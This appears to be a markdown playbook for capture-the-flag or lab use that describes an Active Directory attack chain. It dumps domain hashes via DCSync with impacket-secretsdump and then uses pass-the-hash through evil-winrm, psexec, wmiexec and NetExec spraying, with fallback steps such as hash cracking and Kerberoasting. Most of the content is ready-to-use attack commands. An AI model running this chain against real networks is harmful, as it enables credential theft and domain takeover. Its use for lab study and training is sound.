# AD DCSync And Pass-The-Hash Chain

Use when a credential, group, or ACL gives directory replication rights, or when a challenge gives a backup/domain-sync account. This chain turns domain replication into hashes, then hashes into admin access.

## Signals

- User is named `backup`, `svc-admin`, `sync`, `replication`, or has BloodHound DCSync rights.
- `secretsdump -just-dc` succeeds.
- NTDS/registry hives are available.
- NTLM hashes appear in a backup share.

## Main Path

```bash
impacket-secretsdump -just-dc domain.local/user:pass@dc.domain.local
impacket-secretsdump -just-dc domain.local/user@dc.domain.local -hashes :NTHASH
```

Use an admin hash:

```bash
evil-winrm -i target -u Administrator -H NTHASH
impacket-psexec domain.local/Administrator@target -hashes :NTHASH
impacket-wmiexec domain.local/Administrator@target -hashes :NTHASH
```

If hashes came from a file:

```bash
cut -d: -f1 backup.txt > users.txt
cut -d: -f4 backup.txt > ntlm-hashes.txt
nxc smb target -u users.txt -H ntlm-hashes.txt --no-brute --continue-on-success
```

## Options To Try

- If `secretsdump` fails, check whether the account has only local admin or only share access.
- If WinRM does not accept the hash, try SMB exec, WMI exec, RDP with password, or another host.
- If the hash belongs to a machine account, test SMB admin shares and service execution carefully in lab scope.
- If only `ntds.dit` is available, obtain SYSTEM and parse offline.
- If no admin hash works, crack user hashes and re-run Kerberoasting, SMB, WinRM, and BloodHound.

## Study Examples

- Cajac Attacktive Directory: backup credential -> `secretsdump -just-dc` -> Administrator hash -> Evil-WinRM.
- 0xb0b Soupedecode 01: backup share hashes -> pass-the-hash as `FileServer$` -> SMB exec.
